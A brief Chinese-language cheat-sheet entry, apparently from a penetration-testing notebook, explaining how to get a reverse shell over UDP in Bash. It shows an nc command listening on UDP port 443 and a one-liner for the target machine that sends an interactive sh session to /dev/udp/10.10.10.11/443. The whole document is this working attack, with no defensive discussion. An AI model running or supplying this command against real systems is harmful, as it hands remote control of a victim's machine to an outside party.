# Bash环境下反弹UDP协议shell

首先在本地监听UDP协议443端口

```bash
nc -u -lvp 443

```

然后在靶机上执行如下命令：

```bash
sh -i >& /dev/udp/10.10.10.11/443 0>&1

```

